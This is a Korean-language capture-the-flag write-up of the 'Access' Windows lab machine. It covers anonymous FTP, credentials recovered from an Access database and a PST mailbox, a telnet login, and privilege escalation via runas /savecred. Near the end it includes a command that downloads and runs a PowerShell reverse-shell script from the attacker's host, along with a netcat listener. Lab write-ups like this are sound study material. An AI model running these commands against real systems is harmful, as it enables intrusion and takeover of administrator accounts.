---
slug: "access"
title: "Access"
date: 2026-07-14
category: "윈도우"
tags: []
excerpt: "23 -> ssh가 아니라 telnet이 열려있음"
readingTime: 5
---

---
#### Box: Access | Windows | Easy
날짜:
소요시간: 2026 07 13

##### Open Ports
21 : ftp
23 : telnet
80
##### Interesting Services
21 -> ftp anonymous 켜져 있음
- 다운 받기 전에 바이너리로 받아야함
- Backups에 backup.mdb가 있고 .mdb는 access를 이용한 백업 디비임
- Engineer에는 Access Control.zip이 있음 근데 `access control.pst` 파일에 암호가 걸려 있어

23 -> ssh가 아니라 telnet이 열려있음

80 -> MegaCorp 라는 타이틀이 있고 Lon-MC6 이렇게 컴퓨터 장비 인듯 한 이미지가 있음
- gobuster 돌려보니 aspnet_client 라는 페이지가 있었음
##### Initial Foothold
벡터: 
명령어: 
ftp 에서 가져온 파일 두개를 각각 읽어 볼거임 
```sh
> mdb-schema backup.mdb | grep password -B 50

CREATE TABLE [auth_user]
 (
        [id]                    Long Integer, 
        [username]                      Text (50), 
        [password]                      Text (50), 
        

> mdb-export backup.mdb auth_user

id,username,password,Status,last_login,RoleID,Remark
25,"admin","admin",1,"08/23/18 21:11:47",26,
27,"engineer","access4u@security",1,"08/23/18 21:13:36",26,
28,"backup_admin","admin",1,"08/23/18 21:14:02",26,
```
->이렇게 읽을 수 있음

저기서 나온 engineer 의 크레덴셜로 .zip 파일을 압축해제하고

```sh
> readpst -o ./ 'Access Control.pst' 
Opening PST file and indexes...
Processing Folder "Deleted Items"
        "Access Control" - 2 items done, 0 items skipped.


> ls
'Access Control.mbox'  'Access Control.pst'  'Access Control.zip'   backup.mdb   initial.txt

> cat 'Access Control.mbox'
The password for the “security” account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.
```
-> 해당 크레덴셜을 이용해 텔넷에 security 로 접속

```
telnet 10.129.5.48
login: security
password: 4Cc3ssC0ntr0ller
```
-> **user.txt :** c1b355d2266351ceb71b8d6aaa0d8fde

##### Privilege Escalation
벡터: 
명령어: 
![](assets/images/posts/Pasted%20image%2020260713182739.png)
여기 보니까 
```sh
runas /user:ACCESS\Administrator /savecred
```
라는게 적혀있음 run as로 다른 계정의 권한으로 프로그램을 실행할 수 있다고 함

그리고 아래 커맨드로 관리자 비밀번호가 캐싱돼 있는게 있다는 것를 확인할 수 있음
~~~
C:\Users\Public\Desktop> cmdkey /list

Currently stored credentials:

    Target: Domain:interactive=ACCESS\Administrator
    Type: Domain Password
    User: ACCESS\Administrator
~~~

자 이제 이걸 이용해서 리버스쉘을 ㄱㄱ
~~~sh
# 칼리에서 
sudo apt install nishang
cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 .
echo "Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.28 -Port 443" >> Invoke-PowerShellTcp.ps1
# 아래 두개 각각 켜놓고
python3 -m http.server 8000
nc -lnvp 443

#타겟에서 아래 실행하면 루트 권한 획득!
runas /user:ACCESS\Administrator /savecred "powershell -c IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.28:8000/Invoke-PowerShellTcp.ps1')"
~~~
-> **root.txt :** 5a65a90436bf0c47f756d0fa3fbf4247

##### Rabbit Hole (막혔던 것)

##### 다음 박스에서 써먹을 것
- runas가 리눅스 sudo 같은 느낌임
- 하지만 비밀번호가 있어야 되기에 /savecred 있어야되고 cmdkey /list로 관리자 있는지 확인 ㄱㄱ
- 파워쉘 리버스 쉘 읽기